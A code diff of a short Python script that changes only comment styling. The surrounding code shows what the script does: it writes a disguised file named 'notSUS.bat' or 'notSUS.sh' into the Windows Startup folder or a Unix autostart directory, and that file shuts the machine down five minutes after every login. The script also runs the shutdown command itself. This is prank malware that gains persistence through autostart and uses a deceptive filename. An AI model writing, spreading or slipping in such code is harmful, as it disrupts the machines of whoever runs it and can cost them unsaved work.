@@ -3,7 +3,7 @@ import subprocess
 import sys
 from pathlib import Path
 
-# INITIALIZE VARIABLES
+# Initialize variables:
 SD_MESSAGE: str = "PC is shutting down in {time}."
 SD_MINUTES: int = 5
 
@@ -11,12 +11,12 @@ SD_MINUTES: int = 5
 def main() -> None:
     global SD_MESSAGE, SD_MINUTES
 
-    # GET FINAL VARIABLE VALUES
+    # Get final variable values:
     minutes_str = f"{SD_MINUTES} minute" if SD_MINUTES == 1 else f"{SD_MINUTES} minutes"  # type:ignore[reportUnnecessaryComparison]
     SD_MESSAGE = SD_MESSAGE.format(time=minutes_str)  # type:ignore[reportConstantRedefinition]
     secs = SD_MINUTES * 60
 
-    # SET PLATFORM-SPECIFIC VARIABLES
+    # Set platform-specific variables:
     if sys.platform == "win32":
         autostart = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
         script_path = autostart / "notSUS.bat"
@@ -26,12 +26,12 @@ def main() -> None:
         script_path = autostart / "notSUS.sh"
         script_content = f"#!/bin/sh\nshutdown -h +{SD_MINUTES} '{SD_MESSAGE}'"
 
-    # CREATE FILE IN STARTUP DIRECTORY, WITH SHUTDOWN COMMAND INSIDE
+    # Create file in startup directory, with shutdown command inside:
     autostart.mkdir(parents=True, exist_ok=True)
     with open(script_path, "w") as f:
         f.write(script_content)
 
-    # SET FILE PERMISSIONS AND RUN SHUTDOWN COMMAND
+    # Set file permissions and run shutdown command:
     if sys.platform != "win32":
         script_path.chmod(0o755)
     if sys.platform == "win32":
